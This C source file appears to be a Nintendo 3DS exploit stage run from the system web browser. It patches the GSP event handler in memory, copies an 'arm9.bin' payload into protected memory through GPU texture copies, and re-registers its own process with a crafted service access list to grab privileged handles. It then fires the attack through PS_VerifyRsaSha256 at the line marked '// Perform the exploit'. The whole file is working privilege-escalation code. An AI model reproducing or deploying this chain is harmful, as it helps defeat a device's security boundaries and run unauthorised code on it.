#include "GPU.h"
#include "IFile.h"
#include "pointers.h"
#include "svc.h"
#include "lib.h"
#include "utils.h"
#include "types.h"

//FIXME do we need these constants?
#define SPIDER_DATARO_START 0x00359000 //FIXME is this 2.1 specific?
#define SPIDER_DATABSS_START 0x003C7000 //FIXME is this 2.1 specific?

//FIXME what is this for?
static const u8 access_bin[] =
{
	0x41, 0x50, 0x54, 0x3A, 0x55, 0x00, 0x00, 0x00, 0x79, 0x32, 0x72, 0x3A, 0x75, 0x00, 0x00, 0x00,
	0x67, 0x73, 0x70, 0x3A, 0x3A, 0x47, 0x70, 0x75, 0x6E, 0x64, 0x6D, 0x3A, 0x75, 0x00, 0x00, 0x00,
	0x66, 0x73, 0x3A, 0x55, 0x53, 0x45, 0x52, 0x00, 0x68, 0x69, 0x64, 0x3A, 0x55, 0x53, 0x45, 0x52,
	0x64, 0x73, 0x70, 0x3A, 0x3A, 0x44, 0x53, 0x50, 0x63, 0x66, 0x67, 0x3A, 0x75, 0x00, 0x00, 0x00,
	0x66, 0x73, 0x3A, 0x52, 0x45, 0x47, 0x00, 0x00, 0x70, 0x73, 0x3A, 0x70, 0x73, 0x00, 0x00, 0x00,
	0x6E, 0x73, 0x3A, 0x73, 0x00, 0x00, 0x00, 0x00, 0x61, 0x6D, 0x3A, 0x6E, 0x65, 0x74, 0x00, 0x00,
};

static void flashScreen(void)
{
	// Fills the bottom buffer with a random pattern
	// Change this to the addresses read from gpu reg later
	void *src = work_buffer; // Random buffer location, see pointers.11.h
	for (int i = 0; i < 3; i++)
	{  // Do it 3 times to be safe
		GSPGPU_FlushDataCache(src, 0x00038400);
		GX_SetTextureCopy(src, (void *)0x1F48F000, 0x00038400, 0, 0, 0, 0, 8);
		svc_sleepThread(0x400000LL);
		GSPGPU_FlushDataCache(src, 0x00038400);
		GX_SetTextureCopy(src, (void *)0x1F4C7800, 0x00038400, 0, 0, 0, 0, 8);
		svc_sleepThread(0x400000LL);
	}
}

void main(void)
{
	svc_sleepThread(0x10000000);

	// Get framebuffer addresses
	uint32_t regs[10];

	regs[0] = 0xDEADBABE;
	regs[1] = 0xBABEDADA;

	//FIXME where do these reg addresses come from?
	_GSPGPU_ReadHWRegs(gspHandle, 0x400468, &regs[0+2], 8); // framebuffer 1 top left & framebuffer 2 top left
	_GSPGPU_ReadHWRegs(gspHandle, 0x400494, &regs[2+2], 8); // framebuffer 1 top right & framebuffer 2 top right
	_GSPGPU_ReadHWRegs(gspHandle, 0x400568, &regs[4+2], 8); // framebuffer 1 bottom & framebuffer 2 bottom
	_GSPGPU_ReadHWRegs(gspHandle, 0x400478, &regs[6+2], 4); // framebuffer select top
	_GSPGPU_ReadHWRegs(gspHandle, 0x400578, &regs[7+2], 4); // framebuffer select bottom

	//patch gsp event handler addr to kill gsp thread ASAP, PA 0x267CF418
	*((u32*)(0x003F8418+0x10+4*0x4))=0x002CA520; //svc 0x9 addr
	svc_sleepThread(0x10000000);

	// Read the main payload to 0x17F00000(0x23F00000 pa)
	u32* buffer = (work_buffer + 0x10000/sizeof(u32));

	IFILE file;
	unsigned int readBytes;
	_memset(&file, 0, sizeof(file));
	IFile_Open(&file, L"dmc:/arm9.bin", 1);

	const uint32_t block_size = 0x10000;
	for(u32 i = 0; i < 0x20000u; i += block_size)
	{
		IFile_Read(&file, &readBytes, (void*)buffer, block_size);
		GSPGPU_FlushDataCache(buffer, block_size);
		GX_SetTextureCopy(buffer, (void *)(0x17F00000 + i), block_size, 0, 0, 0, 0, 8);
		if(readBytes != block_size)
			break;
	}

	u32 fb[3] = {0};

	if(regs[6+2])
	{
		fb[0] = regs[0+2];
	 	fb[1] = regs[2+2];
	}
	else
	{
		fb[0] = regs[1+2];
		fb[1] = regs[3+2];
	}

	if(regs[7+2])
		fb[2] = regs[4+2];
	else
		fb[2] = regs[5+2];

	// Grab access to PS
	Handle port;
	svc_connectToPort(&port, "srv:pm");

	srv_RegisterClient(&port);

	u32 proc = 0;
	svc_getProcessId(&proc, 0xFFFF8001);

	srvUnregisterProcess(&port, proc);

	srvRegisterProcess(&port, proc, 0x18, (const void*)&access_bin[0]);

	Handle ps_handle = 0, pmapp_handle = 0;
	srv_getServiceHandle(&port, &ps_handle, "ps:ps");
	srv_getServiceHandle(&port, &pmapp_handle, "pm:app");

	svc_sleepThread(0x10000000);

	flashScreen();

	// Perform the exploit
	u32 dummy = 0;
	PS_VerifyRsaSha256(&ps_handle, fb);

	while(1);
}
